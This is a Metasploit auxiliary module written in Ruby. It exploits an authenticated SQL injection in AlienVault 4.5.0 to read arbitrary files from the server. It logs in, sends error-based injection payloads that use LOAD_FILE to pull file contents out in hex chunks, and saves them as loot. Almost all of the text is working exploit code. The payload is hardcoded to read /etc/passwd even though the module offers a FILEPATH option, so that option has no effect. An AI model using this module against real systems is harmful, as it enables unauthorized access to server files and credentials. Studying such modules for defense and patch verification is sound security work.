The following metasploit module will exploit this in order to read a file off of the file system:


##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "AlienVault 4.5.0 authenticated SQL injection arbitrary file read",
      'Description'    => %q{
      AlienVault 4.5.0 is susceptible to an authenticated SQL injection attack via a PNG
      generation PHP file. This module exploits this to read an arbitrary file from 
      the file system. Any authed user should be usable. Admin not required.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
        ],
      'References'     =>
        [
        ],
      'Platform'       => ['linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Mar 30 2014"))

      register_options(
      [
        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd']),
        OptString.new('USERNAME', [ true, 'Single username', 'username']),
        OptString.new('PASSWORD', [ true, 'Single password', 'password']),
        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/'])
      ], self.class)

  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')
    })

    cookie = res.get_cookies

    post = {
      'embed' => '',
      'bookmark_string' => '',
      'user' => datastore['USERNAME'],
      'passu' => datastore['PASSWORD'],
      'pass' => Rex::Text.encode_base64(datastore['PASSWORD'])
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
      'method' => 'POST',
      'vars_post' => post,
      'cookie' => cookie
    })

    if res.headers['Location'] != '/ossim/'
      fail_with('Authentication failed')
    end

    cookie = res.get_cookies

    done = false
    i = 0
    full = ''

    while !done
      pay =  "2014-02-28' AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x7175777471,"
      pay << "(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x2f6574632f706173737764)) AS CHAR),"
      pay << "0x20)),#{(50*i)+1},50)),0x7169716d71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
      pay << " GROUP BY x)a) AND 'xnDa'='xnDa"

      get = { 
        'date_from' => pay,
        'date_to' => '2014-03-30'
      }

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'ossim', 'report', 'BusinessAndComplianceISOPCI', 'ISO27001Bar1.php'),
        'cookie' => cookie,
        'vars_get' => get
      })

      file = /quwtq(.*)qiqmq/.match(res.body)

      file = file[1]

      if file == ''
        done = true
      end

      str = [file].pack("H*")
      full << str
      vprint_status(str)

      i = i+1

    end

    path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])
    print_good("File stored at path: " + path)
  end
end
